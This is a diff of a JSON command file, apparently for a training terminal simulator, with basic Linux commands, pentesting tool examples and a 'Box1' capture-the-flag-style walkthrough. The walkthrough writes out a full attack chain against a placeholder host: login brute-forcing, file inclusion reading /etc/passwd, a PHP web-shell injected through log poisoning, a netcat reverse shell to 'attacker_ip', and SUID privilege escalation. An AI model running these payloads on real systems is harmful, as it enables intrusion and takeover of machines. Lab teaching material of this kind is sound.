@@ -1,226 +1,180 @@
 {
-  "windows": {
-    "value": "windows-cmd",
-    "prompt": "PS C:\\>",
-    "commands": [
-      {
-        "command": "more file.txt",
-        "description": "Displays the content of file.txt page by page."
-      },
-      {
-        "command": "cd C:\\Users\\Administrator\\Desktop",
-        "description": "Changes directory to the specified path."
-      },
-      {
-        "command": "dir",
-        "description": "Lists the contents of the directory."
-      },
-      {
-        "command": "copy file1.txt file2.txt",
-        "description": "Copies file1.txt to file2.txt."
-      },
-      {
-        "command": "del file.txt",
-        "description": "Deletes file.txt."
-      },
-      {
-        "command": "mkdir new_folder",
-        "description": "Creates a new directory called new_folder."
-      },
-      {
-        "command": "rmdir old_folder",
-        "description": "Removes the directory old_folder."
-      },
-      {
-        "command": "type file.txt",
-        "description": "Displays the content of file.txt."
-      },
-      {
-        "command": "ren oldname.txt newname.txt",
-        "description": "Renames oldname.txt to newname.txt."
-      },
-      {
-        "command": "move file.txt D:\\new_location\\",
-        "description": "Moves file.txt to the new location."
-      }
-    ]
-  },
-  "linux": {
-    "value": "linux-terminal",
-    "prompt": "root@kali:~#",
-    "commands": [
-      {
-        "command": "ls -l",
-        "description": "Lists directory contents in long format."
-      },
-      {
-        "command": "cd /home/user",
-        "description": "Changes directory to the specified path."
-      },
-      {
-        "command": "cat file.txt",
-        "description": "Displays the content of file.txt."
-      },
-      {
-        "command": "cp file1.txt file2.txt",
-        "description": "Copies file1.txt to file2.txt."
-      },
-      {
-        "command": "rm file.txt",
-        "description": "Deletes file.txt."
-      },
-      {
-        "command": "mkdir new_folder",
-        "description": "Creates a new directory called new_folder."
-      },
-      {
-        "command": "rmdir old_folder",
-        "description": "Removes the directory old_folder."
-      },
-      {
-        "command": "echo 'Hello World' > file.txt",
-        "description": "Writes 'Hello World' to file.txt."
-      },
-      {
-        "command": "mv oldname.txt newname.txt",
-        "description": "Renames or moves oldname.txt to newname.txt."
-      },
-      {
-        "command": "scp file.txt user@host:/path",
-        "description": "Securely copies file.txt to the specified path on the host."
-      }
-    ]
-  },
-  "pentesting": {
-    "value": "pentesting",
-    "prompt": "root@kali:~#",
-    "commands": [
-      {
-        "command": "nmap -sS -p 1-65535 target",
-        "description": "Performs a stealth scan on all ports of the target."
-      },
-      {
-        "command": "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs",
-        "description": "Finds databases on the target vulnerable to SQL injection."
-      },
-      {
-        "command": "msfconsole",
-        "description": "Launches the Metasploit Framework console."
-      },
-      {
-        "command": "hydra -l admin -P passwords.txt target ssh",
-        "description": "Brute forces SSH login on the target using the specified username and password list."
-      },
-      {
-        "command": "dirb http://target.com/",
-        "description": "Scans the target website for directories."
-      },
-      {
-        "command": "gobuster dir -u http://target.com/ -w wordlist.txt",
-        "description": "Uses Gobuster to brute force directories on the target website."
-      },
-      {
-        "command": "nc -lvnp 4444",
-        "description": "Sets up a Netcat listener on port 4444."
-      },
-      {
-        "command": "openssl s_client -connect target:443",
-        "description": "Opens an SSL/TLS connection to the target on port 443."
-      },
-      {
-        "command": "john --wordlist=passwords.txt hashes.txt",
-        "description": "Cracks passwords using the specified wordlist and hashes."
-      },
-      {
-        "command": "searchsploit apache 2.4",
-        "description": "Searches for exploits related to Apache 2.4."
-      }
-    ]
-  },
-  "Box1 Walkthrough": {
-    "value": "Box1 Walkthrough",
-    "prompt": "root@kali:~#",
-    "commands": [
-      {
-        "command": "nmap -sV -sC targetsite.com -p- --script=vuln",
-        "description": "Welcome to Box 1! First, we will begin with scanning it for open ports using Nmap. This command will run a service version detection (-sV), default scripts (-sC), and scan all ports (-p-). The --script=vuln option will run vulnerability scripts to identify potential weaknesses."
-      },
-      {
-        "command": "whatweb http://targetsite.com:8080",
-        "description": "We found an HTTP port open on port 8080. Let's use WhatWeb to identify the site software and gather information about the web server. This will help us determine if we can run any custom dictionaries specifically for this site."
-      },
-      {
-        "command": "curl -O http://targetsite.com:8080/robots.txt",
-        "description": "Let's check the robots.txt file to see if there are any interesting paths or directories that the website owner doesn't want search engines to index. This file can sometimes reveal hidden parts of the website."
-      },
-      {
-        "command": "feroxbuster -u http://targetsite.com:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
-        "description": "Nothing interesting in the robots.txt file. Let's run a directory scan using Feroxbuster to discover hidden directories and files. We'll use a medium-sized wordlist from SecLists to cover a broad range of potential paths."
-      },
-      {
-        "command": "whatweb http://targetsite.com:8080/administration",
-        "description": "We found an administration panel at /administration. Let's use WhatWeb again to see if it's running a specific software version that might have known vulnerabilities or default credentials."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration",
-        "description": "Upon investigating the administration panel, we discovered it's running 'Charm CMS'. A quick Google search reveals that the default admin username is 'administrator'. Let's inspect how the login request is being sent by using curl to fetch the login page."
-      },
-      {
-        "command": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt targetsite.com http-post-form \"/administration:index=Login failed\"",
-        "description": "Based on the inspection, we identified the login form fields and crafted a Hydra command to brute-force the login. The -l option sets the username to 'administrator', and -P specifies the path to the password wordlist (rockyou.txt). The http-post-form module is used to specify the login form parameters and the failure message ('Login failed')."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration/panel",
-        "description": "Success! We've gained access to the administration panel. While exploring, we find a field vulnerable to Local File Inclusion (LFI). Let's use curl commands to look for sensitive files."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration/panel?file=/etc/passwd",
-        "description": "Using the LFI vulnerability, let's try to access the /etc/passwd file to gather information about the system users."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log",
-        "description": "To escalate this LFI to Remote Code Execution (RCE), we will inject a malicious payload into the Apache access log by setting a custom User-Agent header. First, let's access the log file."
-      },
-      {
-        "command": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://targetsite.com:8080",
-        "description": "Inject the PHP code into the Apache log using the User-Agent header. This code will allow us to execute commands remotely."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=id",
-        "description": "Now, let's request the Apache access log file and append the cmd parameter to execute the 'id' command, verifying our remote code execution."
-      },
-      {
-        "command": "nc -lvnp 4444",
-        "description": "Set up a Netcat listener on port 4444 to catch the reverse shell. This will allow us to gain interactive access to the target system."
-      },
-      {
-        "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=nc -e /bin/bash attacker_ip 4444",
-        "description": "Use the RCE to send a reverse shell to our Netcat listener. Replace 'attacker_ip' with your actual IP address."
-      },
-      {
-        "command": "which python python2 python3",
-        "description": "Once we have a shell, check for installed Python versions. This will help us in upgrading our shell to a more stable interactive one."
-      },
-      {
-        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-        "description": "Upgrade the shell using Python. This command will spawn a pseudo-terminal, making our shell experience much better."
-      },
-      {
-        "command": "find / -perm -4000 -type f 2>/dev/null",
-        "description": "Search for files with the SUID bit set. These files can potentially be exploited for privilege escalation if they are misconfigured."
-      },
-      {
-        "command": "sudo install -m =xs $(which nmap) .",
-        "description": "Copy the nmap binary to the current directory with the SUID bit set. This gives us elevated privileges when running nmap."
-      },
-      {
-        "command": "LFILE=file_to_write",
-        "description": "Set a variable LFILE to the name of the file we want to write to. This will be used in the next command to exploit the SUID nmap."
-      },
-      {
-        "command": "./nmap -oG=$LFILE DATA",
-        "description": "Use nmap's output option to write arbitrary data to the file specified by LFILE. This can be used to escalate privileges or execute further commands."
-      }
-    ]
-  }
+    "linux": {
+        "value": "linux-terminal",
+        "prompt": "root@kali:~#",
+        "commands": [
+            {
+                "command": "ls -l",
+                "description": "Lists directory contents in long format."
+            },
+            {
+                "command": "cd /home/user",
+                "description": "Changes directory to the specified path."
+            },
+            {
+                "command": "cat file.txt",
+                "description": "Displays the content of file.txt."
+            },
+            {
+                "command": "cp file1.txt file2.txt",
+                "description": "Copies file1.txt to file2.txt."
+            },
+            {
+                "command": "rm file.txt",
+                "description": "Deletes file.txt."
+            },
+            {
+                "command": "mkdir new_folder",
+                "description": "Creates a new directory called new_folder."
+            },
+            {
+                "command": "rmdir old_folder",
+                "description": "Removes the directory old_folder."
+            },
+            {
+                "command": "echo 'Hello World' > file.txt",
+                "description": "Writes 'Hello World' to file.txt."
+            },
+            {
+                "command": "mv oldname.txt newname.txt",
+                "description": "Renames or moves oldname.txt to newname.txt."
+            },
+            {
+                "command": "scp file.txt user@host:/path",
+                "description": "Securely copies file.txt to the specified path on the host."
+            }
+        ]
+    },
+    "pentesting": {
+        "value": "linux-terminal-pentesting",
+        "prompt": "root@kali:~#",
+        "commands": [
+            {
+                "command": "nmap -sS -p 1-65535 target",
+                "description": "Performs a stealth scan on all ports of the target."
+            },
+            {
+                "command": "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs",
+                "description": "Finds databases on the target vulnerable to SQL injection."
+            },
+            {
+                "command": "msfconsole",
+                "description": "Launches the Metasploit Framework console."
+            },
+            {
+                "command": "hydra -l admin -P passwords.txt target ssh",
+                "description": "Brute forces SSH login on the target using the specified username and password list."
+            },
+            {
+                "command": "dirb http://target.com/",
+                "description": "Scans the target website for directories."
+            },
+            {
+                "command": "gobuster dir -u http://target.com/ -w wordlist.txt",
+                "description": "Uses Gobuster to brute force directories on the target website."
+            },
+            {
+                "command": "nc -lvnp 4444",
+                "description": "Sets up a Netcat listener on port 4444."
+            },
+            {
+                "command": "openssl s_client -connect target:443",
+                "description": "Opens an SSL/TLS connection to the target on port 443."
+            },
+            {
+                "command": "john --wordlist=passwords.txt hashes.txt",
+                "description": "Cracks passwords using the specified wordlist and hashes."
+            },
+            {
+                "command": "searchsploit apache 2.4",
+                "description": "Searches for exploits related to Apache 2.4."
+            }
+        ]
+    },
+    "Box1 Walkthrough": {
+        "value": "linux-terminal-box1",
+        "prompt": "root@kali:~#",
+        "commands": [
+            {
+                "command": "nmap -sV -sC targetsite.com -p- --script=vuln",
+                "description": "Welcome to Box 1! First, we will begin with scanning it for open ports using Nmap. This command will run a service version detection (-sV), default scripts (-sC), and scan all ports (-p-). The --script=vuln option will run vulnerability scripts to identify potential weaknesses."
+            },
+            {
+                "command": "whatweb http://targetsite.com:8080",
+                "description": "We found an HTTP port open on port 8080. Let's use WhatWeb to identify the site software and gather information about the web server. This will help us determine if we can run any custom dictionaries specifically for this site."
+            },
+            {
+                "command": "curl -O http://targetsite.com:8080/robots.txt",
+                "description": "Let's check the robots.txt file to see if there are any interesting paths or directories that the website owner doesn't want search engines to index. This file can sometimes reveal hidden parts of the website."
+            },
+            {
+                "command": "feroxbuster -u http://targetsite.com:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+                "description": "Nothing interesting in the robots.txt file. Let's run a directory scan using Feroxbuster to discover hidden directories and files. We'll use a medium-sized wordlist from SecLists to cover a broad range of potential paths."
+            },
+            {
+                "command": "whatweb http://targetsite.com:8080/administration",
+                "description": "We found an administration panel at /administration. Let's use WhatWeb again to see if it's running a specific software version that might have known vulnerabilities or default credentials."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration",
+                "description": "Upon investigating the administration panel, we discovered it's running 'Charm CMS'. A quick Google search reveals that the default admin username is 'administrator'. Let's inspect how the login request is being sent by using curl to fetch the login page."
+            },
+            {
+                "command": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt targetsite.com http-post-form \"/administration:index=Login failed\"",
+                "description": "Based on the inspection, we identified the login form fields and crafted a Hydra command to brute-force the login. The -l option sets the username to 'administrator', and -P specifies the path to the password wordlist (rockyou.txt). The http-post-form module is used to specify the login form parameters and the failure message ('Login failed')."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration/panel",
+                "description": "Success! We've gained access to the administration panel. While exploring, we find a field vulnerable to Local File Inclusion (LFI). Let's use curl commands to look for sensitive files."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration/panel?file=/etc/passwd",
+                "description": "Using the LFI vulnerability, let's try to access the /etc/passwd file to gather information about the system users."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log",
+                "description": "To escalate this LFI to Remote Code Execution (RCE), we will inject a malicious payload into the Apache access log by setting a custom User-Agent header. First, let's access the log file."
+            },
+            {
+                "command": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://targetsite.com:8080",
+                "description": "Inject the PHP code into the Apache log using the User-Agent header. This code will allow us to execute commands remotely."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=id",
+                "description": "Now, let's request the Apache access log file and append the cmd parameter to execute the 'id' command, verifying our remote code execution."
+            },
+            {
+                "command": "nc -lvnp 4444",
+                "description": "Set up a Netcat listener on port 4444 to catch the reverse shell. This will allow us to gain interactive access to the target system."
+            },
+            {
+                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=nc -e /bin/bash attacker_ip 4444",
+                "description": "Use the RCE to send a reverse shell to our Netcat listener. Replace 'attacker_ip' with your actual IP address."
+            },
+            {
+                "command": "which python python2 python3",
+                "description": "Once we have a shell, check for installed Python versions. This will help us in upgrading our shell to a more stable interactive one."
+            },
+            {
+                "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+                "description": "Upgrade the shell using Python. This command will spawn a pseudo-terminal, making our shell experience much better."
+            },
+            {
+                "command": "find / -perm -4000 -type f 2>/dev/null",
+                "description": "Search for files with the SUID bit set. These files can potentially be exploited for privilege escalation if they are misconfigured."
+            },
+            {
+                "command": "sudo install -m =xs $(which nmap) .",
+                "description": "Copy the nmap binary to the current directory with the SUID bit set. This gives us elevated privileges when running nmap."
+            },
+            {
+                "command": "LFILE=file_to_write",
+                "description": "Set a variable LFILE to the name of the file we want to write to. This will be used in the next command to exploit the SUID nmap."
+            },
+            {
+                "command": "./nmap -oG=$LFILE DATA",
+                "description": "Use nmap's output option to write arbitrary data to the file specified by LFILE. This can be used to escalate privileges or execute further commands."
+            }
+        ]
+    }
 }
